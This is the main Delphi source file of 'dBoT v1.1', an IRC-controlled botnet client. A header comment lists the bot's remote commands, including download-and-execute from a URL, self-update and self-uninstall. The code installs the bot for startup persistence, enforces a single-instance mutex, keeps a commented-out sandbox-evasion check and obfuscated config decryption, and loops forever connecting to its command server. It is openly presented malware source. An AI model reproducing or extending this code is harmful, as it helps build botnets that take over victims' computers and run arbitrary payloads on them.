(*     dBoT v1.1 for Smokin3000 :)

Commands [found in untControl]:
.raw <command> : Bot executes raw IRC command [Example: .raw PRIVMSG #dBoT hello]
.login <password> : Logs the bot in to execute commands
.logout : Logs bot out
.execute <file> : Executes file
.newnick : Generates new nickname
.update <url> <file name> : Updates bot [Example: .update http://www.domain.com/update.exe update.exe]
.dlexecute <url> <file name> : Downloads and executes file : [Example: .dlexecute http://www.domain.com/bot.exe bot.exe]
.download <url> <file name> : Just downloads file : [Example: .download http://www.domain.com/bot.exe bot.exe]
.reconnect : Bot Reconnects
.close : Bot exe closes
.uninstall : Bot removes itself from system
.info : Displays bot info
*)

program dBoT;

{%File 'Settings.ini'}

uses
  Windows,
  untBot in 'Units\untBot.pas',
  untAdminSystem in 'Units\untAdminSystem.pas',
  untControl in 'Units\untControl.pas',
  untFunctions in 'Units\untFunctions.pas',
  untHTTPDownload in 'Units\untHTTPDownload.pas';

begin
  {$IFNDEF DEBUG}
   // If IsInSandBox Then ExitProcess(0);   <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
  {$ENDIF}

  Startup(bot_installname);

  CreateMutex(nil, false, pchar(bot_mutexname));
  if GetLastError = ERROR_ALREADY_EXISTS then begin
    exitprocess(0);
  end;

  { bot_mutexname = Decrypt(bot_mutexname,'$$$$');
   bot_installname = Decrypt(bot_installname,'$$$$');
   bot_prefix = Decrypt(bot_prefix,'$$$$');
   server_address = Decrypt(server_address,'$$$$');
   server_port = Decrypt(server_port,'$$$$');
   server_channel = Decrypt(server_channel,'$$$$');
   server_channelkey = Decrypt(server_channelkey,'$$$$');
   server_adminkey = Decrypt(server_adminkey,'$$$$');}

  Admin := TAdmin.Create;
  mainIRC := TIRCBot.Create;
  Repeat
    mainIRC.Initialize;
    Sleep(60000);
    Admin.ClearAdmin;
  Until 1=2;
end.
